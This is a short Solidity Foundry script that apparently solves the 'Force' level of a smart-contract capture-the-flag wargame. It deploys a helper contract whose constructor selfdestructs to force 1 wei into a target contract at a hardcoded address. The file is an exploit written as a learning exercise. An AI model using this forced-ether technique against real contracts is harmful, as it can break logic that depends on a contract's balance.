// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Script.sol";
import "forge-std/console.sol";
import "../src/Force.sol";


contract distructer
{
     constructor (address payable force_ad) payable
               {
                    selfdestruct(force_ad);
               }
}

contract Level7Solution is Script
{


function run() external
    {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));

        new distructer{value: 1 wei}(payable (0x07Ee44003DF0A55986b68A78f11B35E44A3d7d5C));

        vm.stopBroadcast();
    }

}